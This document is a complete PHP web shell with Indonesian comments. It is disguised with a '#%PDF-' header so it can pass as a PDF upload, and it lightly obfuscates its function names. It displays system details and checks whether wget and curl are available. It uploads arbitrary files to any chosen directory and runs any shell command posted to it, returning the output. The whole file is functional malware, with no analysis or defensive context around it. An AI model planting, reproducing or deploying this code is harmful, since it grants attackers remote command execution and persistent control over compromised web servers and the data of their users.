#%PDF-
<?php
@ini_set('log_errors', 0);
@ini_set('display_errors', 1);
@error_reporting(E_ALL);
while(@ob_end_clean());

$f = 'move' . '_uploaded_' . 'file';
$g = 'get' . 'cwd';
$d = empty($_POST['x1']) ? '' : $_POST['x1'];
$w = empty($_POST['x2']) ? $g() : $_POST['x2'];
$u = $_SERVER['REQUEST_URI'];
$s = '';

// --- FUNGSI TAMBAHAN UNTUK CEK COMMAND/VERSION ---
function get_cmd_version($cmd) {
    if (function_exists('shell_exec')) {
        $result = @shell_exec($cmd . ' --version 2>&1');
        if ($result === null || $result === false) {
            return '❌ Not Found / Disabled';
        }

        // Ambil baris pertama atau versi
        $lines = explode("\n", trim($result));
        if (empty($lines[0])) {
             return '❌ Not Found / Disabled';
        }
        
        // Coba ekstrak versi
        $version = '';
        foreach ($lines as $line) {
            $line = trim($line);
            if (stripos($line, 'version') !== false) {
                // Contoh: GNU Wget 1.20.3 built on linux-gnu.
                // Contoh: curl 7.64.1 (x86_64-pc-linux-gnu) libcurl/7.64.1 OpenSSL/1.1.1b zlib/1.2.11 libidn2/2.0.5 libpsl/0.20.2 (+libidn2/2.0.5) libssh2/1.8.0 nghttp2/1.36.0
                $version = strip_tags(htmlentities(substr($line, 0, 70) . (strlen($line) > 70 ? '...' : '')));
                break;
            }
        }
        
        return $version ?: '✅ Found (Version Unknown/Hidden)';
    } else {
        return '❌ shell_exec Disabled';
    }
}
// --- AKHIR FUNGSI TAMBAHAN ---

// --- INFORMASI SISTEM ---
$os = php_uname('s') . ' ' . php_uname('r');
$server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'N/A';
$wget_info = get_cmd_version('wget');
$curl_info = get_cmd_version('curl');
// --- AKHIR INFORMASI SISTEM ---

if (isset($_FILES['f1']) && $_FILES['f1']['error'] === UPLOAD_ERR_OK) {
  $t = $w . '/' . basename($_FILES['f1']['name']);
  if ($f($_FILES['f1']['tmp_name'], $t)) {
    $s .= "[+] File uploaded: <i>$t</i> (" . $_FILES['f1']['size'] . " bytes)<br />";
  }
}

// --- TAMPILAN INFORMASI DI POJOK KIRI ATAS ---
echo "<b>System :</b> $os<br>";
echo "<b>Server Ip :</b> $server_ip<br>";
echo "<b>Wget :</b> $wget_info<br>";
echo "<b>Curl :</b> $curl_info<br>";
echo "<hr>";
// --- AKHIR TAMPILAN INFORMASI ---

?>
<form method="post" action="<?php echo $u; ?>" enctype="multipart/form-data">
  <input type="text" name="x2" value="<?php echo $w; ?>" size="50">
  <input type="file" name="f1">
  <input type="text" name="x1" value="<?php echo $d; ?>" size="50">
  <input type="submit" value="GO">
</form>
<hr>
<?php
echo "<pre>$s";
if (!empty($d)) {
  echo "[~] Executing: $d\n";
  $p = @popen((DIRECTORY_SEPARATOR === '/' ? 'exec 2>&1; ' : 'cmd /C "') . $d . (DIRECTORY_SEPARATOR !== '/' ? '"' : ''), 'r');
  while (!feof($p)) echo @fread($p, 4096);
  @pclose($p);
}
echo "</pre>";
?>